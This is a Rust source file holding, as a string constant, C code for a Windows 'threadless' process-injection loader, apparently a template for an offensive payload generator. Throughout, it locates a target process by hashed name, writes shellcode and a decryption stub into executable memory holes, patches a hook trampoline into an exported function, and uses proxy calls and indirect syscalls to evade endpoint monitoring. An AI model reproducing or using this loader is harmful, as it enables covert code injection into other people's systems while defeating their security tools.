pub const THREADLESS_INJECTION_C: &str = r#"#include "threadless_injection.h"
#include "macros.h"
#include "proxycall.h"
#include "winapi.h"
#include <windows.h>

unsigned char g_HookShellcode[63] = {
    0x5b, 0x48, 0x83, 0xEB, 0x04, 0x48, 0x83, 0xEB, 0x01, 0x53, 0x51,
    0x52, 0x41, 0x51, 0x41, 0x50, 0x41, 0x53, 0x41, 0x52, 0x48, 0xB9,
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x48, 0x89, 0x0B,
    0x48, 0x83, 0xEC, 0x20, 0x48, 0x83, 0xEC, 0x20, 0xE8, 0x11, 0x00,
    0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5A, 0x41, 0x5B, 0x41,
    0x58, 0x41, 0x59, 0x5A, 0x59, 0x5B, 0xFF, 0xE3};

#define STATUS_SUCCESS 0x00000000
#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004
#ifdef LOCAL
typedef VOID(NTAPI *RtlAcquireSRWLockExclusive)(IN OUT PRTL_SRWLOCK SRWLock);
#endif
extern NT_API g_NT_API;
extern NT_CONFIG g_NT_CONFIG;

typedef NTSTATUS (*fnNtQuerySystemInformation)(
    IN SYSTEM_INFORMATION_CLASS SystemInformationClass, // sizeof => 4
    OUT PVOID SystemInformation,                        // sizeof => 8
    IN ULONG SystemInformationLength,                   // sizeof => 4
    OUT PULONG ReturnLength OPTIONAL);                  // sizeof => 8
typedef HANDLE(WINAPI *fnOpenProcess)(DWORD dwDesiredAccess,
                                      BOOL bInheritHandle, DWORD dwProcessId);

HANDLE EnumProcessByName(DWORD dwProcessHash);
BOOL FindMemoryHole(HANDLE hProcess, ULONG_PTR *puAddress,
                    ULONG_PTR uExportedFuncAddress, SIZE_T sPayloadSize);
HMODULE GetNtdllHandle();
int CheckLaunchConfig();
void PatchKann(PBYTE pMainMemoryHole, SIZE_T dwMainBufferSize,
               PBYTE pKannBuffer, SIZE_T dwKannBufferSize);
BOOL HookFunction(HANDLE hProcess, PVOID pHookedFunction,
                  PVOID pKannMemoryHole);

void LoadTargetFunctionConfig(PTARGETFUNCTIONCONFIG pTargetFunctionConfig,
                              DWORD TargetProcess_Hash, DWORD HookFunction_Hash,
                              DWORD HookFunctionDll_Hash,
                              DWORD PayloadFunction_Hash,
                              DWORD PayloadFunctionDll_Hash,
                              DWORD dwMainBufferSize, DWORD dwKannBufferSize) {
    pTargetFunctionConfig->TargetProcess_Hash = TargetProcess_Hash;
    pTargetFunctionConfig->HookFunction_Hash = HookFunction_Hash;
    pTargetFunctionConfig->HookFunctionDll_Hash = HookFunctionDll_Hash;
    pTargetFunctionConfig->PayloadFunction_Hash = PayloadFunction_Hash;
    pTargetFunctionConfig->PayloadFunctionDll_Hash = PayloadFunctionDll_Hash;
    pTargetFunctionConfig->dwMainBufferSize = dwMainBufferSize;
    pTargetFunctionConfig->dwKannBufferSize = dwKannBufferSize;
};
int CheckTargetFunctionConfig(PTARGETFUNCTIONCONFIG pTargetFunctionConfig,
                              PTHREADLESSCONFIG pThreadlessConfig) {
    HANDLE hProcess = NULL;
    PVOID pHookedFunction, pPayloadFunction, pKannMemoryHole,
        pMainMemoryHole = NULL;

#ifdef LOCAL
    hProcess = NtCurrentProcess();
#endif

#ifdef REMOTE
    /* target process exist check */
    if ((hProcess = EnumProcessByName(
             pTargetFunctionConfig->TargetProcess_Hash)) == NULL) {
        return 0;
    }
#endif
    if (hProcess == NULL) return 0;

    /* Hooked Function Address check, we will install hook on this address */
    if ((pHookedFunction = GetProcAddressS(
             GetModuleHandleS(pTargetFunctionConfig->HookFunctionDll_Hash),
             pTargetFunctionConfig->HookFunction_Hash)) == NULL) {
#ifdef DEBUG
        PRINTA("[-] Can't Found Target Function\n");
        return 0;
#endif
    }
#ifdef DEBUG
    PRINTA("[+] Found Target Hook Function at : %p\n", pHookedFunction);
#endif

    /* Payload Function Address check, we will use this address to find
     * main payload memory hole address */
    if ((pPayloadFunction = GetProcAddressS(
             GetModuleHandleS(pTargetFunctionConfig->PayloadFunctionDll_Hash),
             pTargetFunctionConfig->PayloadFunction_Hash)) == NULL) {
#ifdef DEBUG
        PRINTA("[-] Can't Found Target Function\n");
        return 0;
#endif
    }

    /* Target process memory hole for Main Payload check */
    if (!FindMemoryHole(hProcess, &pMainMemoryHole, (ULONG_PTR)pPayloadFunction,
                        pTargetFunctionConfig->dwMainBufferSize)) {
#ifdef DEBUG
        PRINTA("[-] Can't Found Target Memory Hole (main payload too large?)");
#endif
        return 0;
    }

    /* Target process memory hole for Kann Payload + hookshellcode check */
    if (!FindMemoryHole(hProcess, &pKannMemoryHole, (ULONG_PTR)pHookedFunction,
                        (pTargetFunctionConfig->dwKannBufferSize +
                         sizeof(g_HookShellcode)))) {
#ifdef DEBUG
        PRINTA("[-] Can't Found Target Memory Hole (kann payload too large?)");
        return 0;
#endif
    }

    pThreadlessConfig->hProcess = hProcess;
    pThreadlessConfig->pHookedFunction = pHookedFunction;
    pThreadlessConfig->pMainMemoryHole = pMainMemoryHole;
    pThreadlessConfig->pKannMemoryHole = pKannMemoryHole;
    pThreadlessConfig->dwMainBufferSize =
        pTargetFunctionConfig->dwMainBufferSize;
    pThreadlessConfig->dwKannBufferSize =
        pTargetFunctionConfig->dwKannBufferSize;

    return 1;
}

int Launch(PTHREADLESSCONFIG pThreadlessConfig) {

#ifdef DEBUG
    PRINTA("[+] Start Threadless Injection\n");
#endif

    if (!CheckLaunchConfig()) return 0;

    HANDLE hNtdll = GetNtdllHandle();
    Search_For_Syscall_Ret(hNtdll);
    Search_For_Add_Rsp_Ret(hNtdll);

    /* [1] we write main payload into target process */
    SIZE_T sByteWritten = NULL;
    ULONG uOldProtection = NULL;
    SIZE_T sMainBufferSize = (SIZE_T)pThreadlessConfig->dwMainBufferSize;
    SIZE_T sKannBufferSize = (SIZE_T)pThreadlessConfig->dwKannBufferSize;
    PVOID pMainMemoryHole = pThreadlessConfig->pMainMemoryHole;
    PVOID pKannMemoryHole = pThreadlessConfig->pKannMemoryHole;
    PVOID pMainBuffer = pThreadlessConfig->pMainBuffer;
    PVOID pKannBuffer = pThreadlessConfig->pKannBuffer;
    PVOID pHookedFunction = pThreadlessConfig->pHookedFunction;
#ifdef LOCAL
    HANDLE hProcess = NtCurrentProcess();
#endif
#ifdef REMOTE
    HANDLE hProcess = pThreadlessConfig->hProcess;
#endif
    PCNtWriteVirtualMemory(hProcess, pMainMemoryHole, pMainBuffer,
                           sMainBufferSize, &sByteWritten);
    if (sByteWritten == NULL) {
        /* if the proxy call failed, try indirect syscall method */
        CONFIGURE_SYSCALL(g_NT_API.NtWriteVirtualMemory);
        if (SysCall(hProcess, pMainMemoryHole, pMainBuffer, sMainBufferSize,
                    &sByteWritten)) {
#ifdef DEBUG
            PRINTA("[-] Fail to write main payload\n");
#endif
            return 0;
        }
    }

#ifdef DEBUG
    PRINTA("[+] Main Shellcode Payload Write target process at %p\n",
           pMainMemoryHole);
    PRINTA("[+] Written %d byte - need byte %d", sByteWritten,
           pThreadlessConfig->dwMainBufferSize);
#endif

    /* [2] we need to patch kann shellcode and hook shellcode */
    PatchKann((PBYTE)pMainMemoryHole, sMainBufferSize, (PBYTE)pKannBuffer,
              sKannBufferSize);
    PatchHookShellcode(pHookedFunction);

    /* [3] we write hook and kann payload into target process , and change those
     * shellcode memory  permission */
    sByteWritten = NULL;
    PCNtWriteVirtualMemory(hProcess, pKannMemoryHole, g_HookShellcode,
                           sizeof(g_HookShellcode), &sByteWritten);
    if (sByteWritten == NULL) {
        /* if the proxy call failed, we use indirect syscall */
        CONFIGURE_SYSCALL(g_NT_API.NtWriteVirtualMemory);
        if (SysCall(hProcess, pKannMemoryHole, g_HookShellcode,
                    sizeof(g_HookShellcode), &sByteWritten)) {
#ifdef DEBUG
            PRINTA("[-] Failed to write store function state Shellcode\n");
#endif
            return 0;
        }
    };

#ifdef DEBUG
    PRINTA(
        "[+] Hook (store function state) Payload Write target process at %p\n",
        pKannMemoryHole);
    PRINTA("[+] Written %d byte - real byte %d\n", sByteWritten,
           sizeof(g_HookShellcode));
#endif
    ULONG uKannBufferByteWritten = NULL;
    ULONG_PTR newKannAddress = (ULONG_PTR)(pKannMemoryHole + sByteWritten);
    PCNtWriteVirtualMemory(hProcess, newKannAddress, (PVOID)pKannBuffer,
                           sKannBufferSize, &uKannBufferByteWritten);
    if (uKannBufferByteWritten == NULL) {
        /* if failed, we use indirect syscall */
        CONFIGURE_SYSCALL(g_NT_API.NtWriteVirtualMemory);
        if (SysCall(hProcess, newKannAddress, (PVOID)pKannBuffer,
                    sKannBufferSize, &uKannBufferByteWritten)) {
#ifdef DEBUG
            PRINTA("[-] Failed to write Kann Shellcode\n");
#endif
            return 0;
        }
    }
#ifdef DEBUG
    PRINTA("[+] Kann Payload Write target process at %p\n", newKannAddress);
    PRINTA("[+] Written %d byte - real byte %d\n", uKannBufferByteWritten,
           pThreadlessConfig->dwKannBufferSize);
#endif

    /* [4] we need change kann payload memory so that after jump to kann payload
     * we can execute */
    SIZE_T sAllByteWritten = sByteWritten + uKannBufferByteWritten;
#ifdef DEBUG
    PRINTA("[+] All Byte Written: %d\n", sAllByteWritten);
    PRINTA("[+] will change permission at %p\n",
           pThreadlessConfig->pKannMemoryHole);
#endif
    pKannMemoryHole = pThreadlessConfig->pKannMemoryHole;
    uOldProtection = NULL;
    PCNtProtectVirtualMemory(hProcess, &pKannMemoryHole,
                             (PULONG)&sAllByteWritten, PAGE_EXECUTE_READWRITE,
                             &uOldProtection);
    if (uOldProtection == NULL) {
        /* if change protection failed, we use indriect syscall try again */
        CONFIGURE_SYSCALL(g_NT_API.NtProtectVirtualMemory);
        if (SysCall(hProcess, &pKannMemoryHole, (PULONG)&sAllByteWritten,
                    PAGE_EXECUTE_READWRITE, &uOldProtection)) {

#ifdef DEBUG
            PRINTA("[-] Failed to write Kann Shellcode\n");
#endif
            return 0;
        }
    }

    /* [5] we need patch and install hook */
    if (!HookFunction(pThreadlessConfig->hProcess,
                      pThreadlessConfig->pHookedFunction, pKannMemoryHole))
        return 0;

#ifdef LOCAL

    /* if def LOCAl, we have been hooked RtlAcquireSRWLockExclusive, so we just
     * call RtlAcquireSRWLockExclusive */
    RTL_SRWLOCK rs = {0};
    ((RtlAcquireSRWLockExclusive)pThreadlessConfig->pHookedFunction)(&rs);

    HANDLE hThread = NtCurrentThread();
    WaitForSingleObject(hThread, INFINITE);
    return 1;
#endif

#ifdef DEBUG
    PRINTA("[+] now we wait for the target function called\n");
    PRINTA("[:)] DONE!\n");
#endif

    return 1;
}
#ifdef REMOTE
HANDLE EnumProcessByName(DWORD dwProcessHash) {
    fnNtQuerySystemInformation pNtQuerySystemInformation = NULL;
    fnOpenProcess pOpenProcess = NULL;

    PSYSTEM_PROCESS_INFORMATION SystemProcInfo = NULL;
    LPVOID pToFree = NULL;
    ULONG uR1, uR2 = 0x00;
    NTSTATUS STATUS = 0x00;
    DWORD Flag = 0x00;
    DWORD dwProcessId = 0x00;
    HANDLE hProcess = NULL;

#ifdef DEBUG
    PRINTA("[+] Start enumeration remote process\n");
#endif

    if ((pNtQuerySystemInformation = (fnNtQuerySystemInformation)
             GetProcAddressS(GetModuleHandleS(NTDLL_DLL_HASH),
                             NtQuerySystemInformation_Hash)) == NULL)
        goto _end_function;

    if ((pOpenProcess = (fnOpenProcess)GetProcAddressS(
             GetModuleHandleS(KERNEL32_DLL_HASH), OpenProcess_Hash)) == NULL)
        goto _end_function;

    /* Get the SysProcInfo Length at first */
    if ((STATUS = pNtQuerySystemInformation(SystemProcessInformation, NULL,
                                            0x00, &uR1)) != STATUS_SUCCESS &&
        STATUS != STATUS_INFO_LENGTH_MISMATCH)
        goto _end_function;

    SystemProcInfo = malloc((SIZE_T)uR1);
    pToFree = SystemProcInfo;

    /* Get the SysProcInfo */
    if ((STATUS = pNtQuerySystemInformation(SystemProcessInformation,
                                            SystemProcInfo, uR1, &uR2)) !=
        STATUS_SUCCESS)
        goto _end_function;

    while (TRUE) {
        if (SystemProcInfo->ImageName.Length) {
            CHAR UpperProcName[MAX_PATH];
            DWORD i = 0;
            while (SystemProcInfo->ImageName.Buffer[i]) {
                UpperProcName[i] =
                    (CHAR)UpperChar(SystemProcInfo->ImageName.Buffer[i]);
                i++;
            }
            UpperProcName[i] = '\0';
            /* We Found the target Process */
            if (HASHA(UpperProcName) == dwProcessHash) {
                dwProcessId = *(DWORD *)(&(SystemProcInfo->UniqueProcessId));
#ifdef DEBUG
                PRINTA("[*] Found Target Process [%ls] - %d \n",
                       SystemProcInfo->ImageName.Buffer, dwProcessId);
#endif
                if ((hProcess = CALL(pOpenProcess, PROCESS_ALL_ACCESS, FALSE,
                                     dwProcessId)) == NULL) {
#ifdef DEBUG
                    PRINTA("[-] Can't Open trying found next process\n");
#endif
                    goto _next_process;
                } else {
                    Flag = 0x01;
                    break;
                }
            }
        } else
            goto _next_process;

    _next_process:
        if (!SystemProcInfo->NextEntryOffset) break;
        SystemProcInfo =
            (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo +
                                          SystemProcInfo->NextEntryOffset);
    }
    goto _end_function;

_end_function:
    if (SystemProcInfo) free(pToFree);
    return (Flag) ? hProcess : 0x00;
}
#endif
BOOL FindMemoryHole(HANDLE hProcess, ULONG_PTR *puAddress,
                    ULONG_PTR uExportedFuncAddress, SIZE_T sPayloadSize) {
    if (!g_NT_API.NtAllocateVirtualMemory.pSyscallAddress) {
        if (!InitNtSyscall(&g_NT_CONFIG, NtAllocateVirtualMemory_Hash,
                           S_PTR(NT_SYSCALL, g_NT_API.NtAllocateVirtualMemory)))
            return FALSE;
    }
    ULONG_PTR uAddress = 0;
    SIZE_T sTmpSizeVar = sPayloadSize;
#ifdef LOCAL
    hProcess = NtCurrentProcess();
#endif
    for (uAddress = (uExportedFuncAddress & 0xFFFFFFFFFFF70000) - 0x70000000;
         uAddress < uExportedFuncAddress + 0x70000000; uAddress += 0x10000) {
        CONFIGURE_SYSCALL(g_NT_API.NtAllocateVirtualMemory);

        if (!SysCall(hProcess, &uAddress, 0, &sTmpSizeVar,
                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) {
            *puAddress = uAddress;
            break;
        }
        /* if (SysCall(hProcess, &uAddress, 0, &sTmpSizeVar, */
        /*             MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) */
        /*     continue; */
        /* *puAddress = uAddress; */
        /* break; */
    }
}

int CheckLaunchConfig() {
    if (!g_NT_API.TpAllocWork.pSyscallAddress ||
        !g_NT_API.TpPostWork.pSyscallAddress ||
        !g_NT_API.TpReleaseWork.pSyscallAddress ||
        !g_NT_API.NtProtectVirtualMemory.pSyscallAddress ||
        !g_NT_API.NtWriteVirtualMemory.pSyscallAddress) {

        if (!InitNtSyscall(&g_NT_CONFIG, TpAllocWork_Hash,
                           S_PTR(NT_SYSCALL, g_NT_API.TpAllocWork)) ||
            !InitNtSyscall(&g_NT_CONFIG, TpPostWork_Hash,
                           S_PTR(NT_SYSCALL, g_NT_API.TpPostWork)) ||
            !InitNtSyscall(&g_NT_CONFIG, TpReleaseWork_Hash,
                           S_PTR(NT_SYSCALL, g_NT_API.TpReleaseWork)) ||
            !InitNtSyscall(
                &g_NT_CONFIG, NtProtectVirtualMemory_Hash,
                S_PTR(NT_SYSCALL, g_NT_API.NtProtectVirtualMemory)) ||
            !InitNtSyscall(&g_NT_CONFIG, NtWriteVirtualMemory_Hash,
                           S_PTR(NT_SYSCALL, g_NT_API.NtWriteVirtualMemory)))
            return 0;
    }
#ifdef DEBUG
    PRINTA("[+] Configure Launch Success\n");
#endif
    return 1;
}

void PatchKann(PBYTE pMainMemoryHole, SIZE_T dwMainBufferSize,
               PBYTE pKannBuffer, SIZE_T dwKannBufferSize) {

    int eggIndex = 0;
    for (int i = 0; i < dwKannBufferSize; i++) {
        if (pKannBuffer[i] == 0x88 && pKannBuffer[i + 1] == 0x88 &&
            pKannBuffer[i + 2] == 0x88 && pKannBuffer[i + 3] == 0x88 &&
            pKannBuffer[i + 4] == 0x88 && pKannBuffer[i + 5] == 0x88 &&
            pKannBuffer[i + 6] == 0x88 && pKannBuffer[i + 7] == 0x88) {
#ifdef DEBUG
            PRINTA("[i] Patch Kann shellcode (ProtectDecryptAddress)\n");
#endif
            eggIndex = i;
            break;
        }
    };
    memcpy((void *)&pKannBuffer[eggIndex], &pMainMemoryHole, 8);

    eggIndex = 0;
    for (int i = 0; i < dwKannBufferSize; i++) {
        if (pKannBuffer[i] == 0x49 && pKannBuffer[i + 1] == 0xBA &&
            pKannBuffer[i + 2] == 0x00 && pKannBuffer[i + 3] == 0x00 &&
            pKannBuffer[i + 4] == 0x00 && pKannBuffer[i + 5] == 0x00 &&
            pKannBuffer[i + 6] == 0x00 && pKannBuffer[i + 7] == 0x00 &&
            pKannBuffer[i + 8] == 0x00 && pKannBuffer[i + 9] == 0x00 &&
            pKannBuffer[i + 10] == 0x41 && pKannBuffer[i + 11] == 0xFF &&
            pKannBuffer[i + 12] == 0xE2) {
#ifdef DEBUG
            PRINTA("[i] Patch Kann shellcode (JumpAddress)\n");
#endif
            eggIndex = i + 2;
            break;
        }
    };
    memcpy((void *)&pKannBuffer[eggIndex], &pMainMemoryHole, 8);

    eggIndex = 0;
    for (int i = 0; i < dwKannBufferSize; i++) {
        if (pKannBuffer[i] == 0xDE && pKannBuffer[i + 1] == 0xAD &&
            pKannBuffer[i + 2] == 0x10 && pKannBuffer[i + 3] == 0xAF) {
#ifdef DEBUG
            PRINTA("[i] Patch Kann shellcode (Length)\n");
#endif
            eggIndex = i;
            break;
        }
    };

    memcpy((void *)&pKannBuffer[eggIndex], (void *)&dwMainBufferSize, 8);
#ifdef DEBUG
    PRINTA("Patch Kann shellcode buffer done\n");
#endif
}

BOOL HookFunction(HANDLE hProcess, PVOID pHookedFunction,
                  PVOID pKannMemoryHole) {
    DWORD uOldProtection = 0x00;
    unsigned char uTrampoline[0x05] = {0xE8, 0x00, 0x00, 0x00, 0x00};
    unsigned long ullRVA = (unsigned long)((ULONG_PTR)pKannMemoryHole -
                                           ((ULONG_PTR)pHookedFunction +
                                            sizeof(uTrampoline)));
    SIZE_T sTmpSizeVar = sizeof(uTrampoline);
    SIZE_T sByteWritten = 0x00;
    PVOID pTmpAddress = pHookedFunction;

    memcpy(&uTrampoline[0x01], &ullRVA, sizeof(ullRVA));
#ifdef LOCAL
    hProcess = NtCurrentProcess();
#endif
    PCNtProtectVirtualMemory(hProcess, &pTmpAddress, (PULONG)&sTmpSizeVar,
                             PAGE_EXECUTE_READWRITE, &uOldProtection);
    if (uOldProtection == NULL) {
        /* if proxy call failed, we use indirect syscall */
        CONFIGURE_SYSCALL(g_NT_API.NtProtectVirtualMemory);
        if (SysCall(hProcess, &pTmpAddress, (PULONG)&sTmpSizeVar,
                    PAGE_EXECUTE_READWRITE, &uOldProtection)) {
#ifdef DEBUG
            PRINTA("[-] Failed to change Trampoline shellcode permission\n");
#endif
            return 0;
        }
    }
    PCNtWriteVirtualMemory(hProcess, pHookedFunction, uTrampoline,
                           sizeof(uTrampoline), &sByteWritten);
    if (sByteWritten == NULL) {
        /* if proxy call failed, we use indirect syscall */
        CONFIGURE_SYSCALL(g_NT_API.NtWriteVirtualMemory);
        if (SysCall(hProcess, pHookedFunction, uTrampoline, sizeof(uTrampoline),
                    &sByteWritten)) {
#ifdef DEBUG
            PRINTA("[-] Failed to install function hook\n");
#endif
            return 0;
        }
    }

#ifdef DEBUG
    PRINTA("[+] Trampoline Write target process at %p\n", pHookedFunction);
    PRINTA("[+] Written %d byte - real byte %d", sByteWritten,
           sizeof(uTrampoline));
#endif

    return 1;
}

VOID PatchHookShellcode(IN PVOID pAddressOfExportedFunc) {
    unsigned long long ullOriginalBytes =
        *(unsigned long long *)pAddressOfExportedFunc;
    memcpy(&g_HookShellcode[22], &ullOriginalBytes, sizeof(ullOriginalBytes));
}

"#;